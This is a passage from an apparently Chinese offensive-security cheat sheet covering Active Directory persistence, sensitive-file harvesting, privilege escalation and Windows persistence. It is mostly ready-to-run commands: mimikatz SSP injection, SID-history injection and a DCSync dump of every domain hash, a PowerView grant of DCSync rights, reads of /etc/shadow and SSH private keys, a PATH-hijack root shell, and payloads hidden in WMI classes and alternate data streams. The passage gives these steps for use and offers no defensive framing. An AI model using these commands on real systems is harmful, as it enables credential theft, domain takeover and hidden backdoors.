id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h2><p><a href="https://adsecurity.org/?p=1929">https://adsecurity.org/?p=1929</a> DS恢复模式密码维护 DSRM密码同步</p><blockquote><p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p></blockquote><p><a href="https://www.dcshadow.com/">DCshadow</a></p><h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure><p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p><h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure><h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp"></a><a href="https://adsecurity.org/?p=1906">AdminSDHolder＆SDProp</a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限</p><h5 id="Dcsync后门"><a href="#Dcsync后门" class="headerlink" title="Dcsync后门"></a>Dcsync后门</h5><p>向域成员赋予Dcsync权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;vulntarget,DC&#x3D;com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>在登录了test1域账户的机器上执行Dcsync利用操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync &#x2F;domain:vulntarget.com &#x2F;all &#x2F;csv&quot;</span><br></pre></td></tr></table></figure><h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a href="https://adsecurity.org/?p=2716">https://adsecurity.org/?p=2716</a> <a href="https://www.anquanke.com/post/id/86531">策略对象在持久化及横向渗透中的应用</a></p><h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p><h5 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h5><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">域渗透-Kerberoasting</a></p><h5 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h5><p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></p><h5 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h5><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></p><p>证书伪造： <a href="https://github.com/Ridter/pyForgeCert">pyForgeCert</a></p><h1 id="11-敏感文件"><a href="#11-敏感文件" class="headerlink" title="11.敏感文件"></a>11.敏感文件</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>敏感配置文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini     <span class="comment">//查看系统版本</span></span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml    <span class="comment">//IIS配置文件</span></span><br><span class="line">C:\Windows\repair\sam     <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line">C:\Program Files\mysql\my.ini     <span class="comment">//Mysql配置</span></span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD    <span class="comment">//Mysql root</span></span><br><span class="line">C:\Windows\php.ini    <span class="comment">//php配置信息</span></span><br><span class="line">C:\Windows\my.ini     <span class="comment">//Mysql配置信息</span></span><br><span class="line">C:\Windows\win.ini    <span class="comment">//Windows系统的一个基本系统配置文件</span></span><br></pre></td></tr></table></figure><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>敏感配置文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">#判断是否在docker容器内</span><br><span class="line">/proc/<span class="number">1</span>/cgroup</span><br><span class="line"></span><br><span class="line"># 系统版本</span><br><span class="line">cat /etc/issue</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line"># 账户密码</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br><span class="line"></span><br><span class="line"># 环境变量</span><br><span class="line">cat /etc/profile</span><br><span class="line"></span><br><span class="line"># 系统应用(命令)</span><br><span class="line">ls -lah/sbin</span><br><span class="line"></span><br><span class="line"># 安装应用(命令)</span><br><span class="line">la -lah /usr/bin</span><br><span class="line"></span><br><span class="line"># 开机自启</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line"># history</span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line"></span><br><span class="line"># 网络配置</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/networks</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/host.conf</span><br><span class="line">cat /etc/hosts</span><br><span class="line">cat /etc/dhcpd.conf</span><br><span class="line"></span><br><span class="line"># Service配置</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /etc/httpd/conf/httpd2.conf</span><br><span class="line">cat /<span class="keyword">var</span>/apache2/config.inc</span><br><span class="line">cat /usr/local/etc/nginx/nginx.conf</span><br><span class="line">cat /usr/local/nginx/conf/nginx.conf</span><br><span class="line">cat /etc/my.cnf</span><br><span class="line">cat /etc/mysql/my.cnf</span><br><span class="line">cat /<span class="keyword">var</span>/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /etc/mongod.conf</span><br><span class="line">cat /usr/local/redis/redis.conf</span><br><span class="line">cat /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"># ftp</span><br><span class="line">cat /etc/proftpd.conf</span><br><span class="line"></span><br><span class="line"># mail</span><br><span class="line">cat /<span class="keyword">var</span>/mail/root</span><br><span class="line">cat /<span class="keyword">var</span>/spool/mail/root</span><br><span class="line">cat ~/.fetchmailrc</span><br><span class="line">cat /etc/procmailrc</span><br><span class="line">cat ~/.procmailrc</span><br><span class="line">cat /etc/exim/exim.cf</span><br><span class="line">cat /etc/postfix/main.cf</span><br><span class="line">cat /etc/mail/sendmail.mc</span><br><span class="line">cat /usr/share/sendmail/cf/cf/linux.smtp.mc</span><br><span class="line">cat /etc/mail/sendmail.cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ssh</span><br><span class="line">cat ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># log</span><br><span class="line">ls /<span class="keyword">var</span>/log</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/auth.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/chttp.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/cups/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/dpkg.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/faillog</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lastlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/messages</span><br><span class="line">cat /<span class="keyword">var</span>/log/secure</span><br><span class="line">cat /<span class="keyword">var</span>/log/syslog</span><br><span class="line">cat /<span class="keyword">var</span>/log/wtmp</span><br><span class="line">cat /<span class="keyword">var</span>/log/xferlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/yum.log</span><br><span class="line">cat /<span class="keyword">var</span>/run/utmp</span><br><span class="line">cat /<span class="keyword">var</span>/webmin/miniserv.log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access.log</span><br><span class="line"></span><br><span class="line"># proc fuzz</span><br><span class="line">/proc/self/fd/<span class="number">32</span></span><br><span class="line">/proc/self/fd/<span class="number">33</span></span><br><span class="line">/proc/self/fd/<span class="number">34</span></span><br><span class="line">/proc/self/fd/<span class="number">35</span></span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/version</span><br></pre></td></tr></table></figure><h1 id="12-权限提升"><a href="#12-权限提升" class="headerlink" title="12.权限提升"></a>12.权限提升</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="bypass-UAC"><a href="#bypass-UAC" class="headerlink" title="bypass UAC"></a>bypass UAC</h3><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul><li>使用IFileOperation COM接口</li><li>使用Wusa.exe的extract选项</li><li>远程注入SHELLCODE 到傀儡进程</li><li>DLL劫持，劫持系统的DLL文件</li><li>eventvwr.exe and registry hijacking</li><li>sdclt.exe</li><li>SilentCleanup</li><li>wscript.exe</li><li>cmstp.exe</li><li>修改环境变量，劫持高权限.Net程序</li><li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li><li>直接提权过UAC</li><li>……</li></ul><h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul><li><a href="https://github.com/hfiref0x/UACME">UACME</a></li><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a></li><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko</a></li><li>…</li></ul><h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul><li>windows内核漏洞提权</li></ul><blockquote><p>检测类:<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>,<a href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>,<a href="https://github.com/bitsadmin/wesng">wesng</a></p></blockquote><blockquote><p>利用类:<a href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>，<a href="https://github.com/AlessandroZ/BeRoot.git">BeRoot</a></p></blockquote><ul><li>服务提权</li></ul><blockquote><p>数据库服务，ftp服务等</p></blockquote><ul><li>WINDOWS错误系统配置</li><li>系统服务的错误权限配置漏洞</li><li>不安全的注册表权限配置</li><li>不安全的文件/文件夹权限配置</li><li>计划任务</li><li>任意用户以NT AUTHORITY\SYSTEM权限安装msi</li><li>提权脚本</li></ul><blockquote><p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a>,<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p></blockquote><h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h2><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">ls -al &#x2F;etc&#x2F; | grep cron</span><br><span class="line">ls -al &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;at.allow</span><br><span class="line">cat &#x2F;etc&#x2F;at.deny</span><br><span class="line">cat &#x2F;etc&#x2F;cron.allow</span><br><span class="line">cat &#x2F;etc&#x2F;cron.deny</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>寻找可利用bin：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo “&#x2F;bin&#x2F;sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;home&#x2F;raj&#x2F;script</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/2767">Linux环境变量提权 - 先知社区)</a></p><h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">cat &#x2F;root&#x2F;anaconda-ks.cfg</span><br></pre></td></tr></table></figure><h4 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;berdav&#x2F;CVE-2021-4034</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;arthepsy&#x2F;CVE-2021-4034</span><br></pre></td></tr></table></figure><h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br><span class="line">cat ~&#x2F;.nano_history</span><br><span class="line">cat ~&#x2F;.atftp_history</span><br><span class="line">cat ~&#x2F;.mysql_history</span><br><span class="line">cat ~&#x2F;.php_history</span><br></pre></td></tr></table></figure><h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure><h1 id="13-权限维持"><a href="#13-权限维持" class="headerlink" title="13.权限维持"></a>13.权限维持</h1><h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h2><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。</p><h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> : 存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null)</span><br><span class="line">$StaticClass.Name &#x3D; &#39;Win32_Command&#39;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)</span><br><span class="line">$StaticClass.Put() </span><br></pre></td></tr></table></figure><p>读取:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Payload&#x3D;([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value</span><br></pre></td></tr></table></figure><p><strong>包含数字签名的PE文件</strong> 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 <strong>特殊ADS</strong> …</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure><p>特殊COM文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure><p>磁盘根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure><h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><p>管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure><h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure><h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath&#x3D; BinaryPathName</span><br></pre></td></tr></table></figure><h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 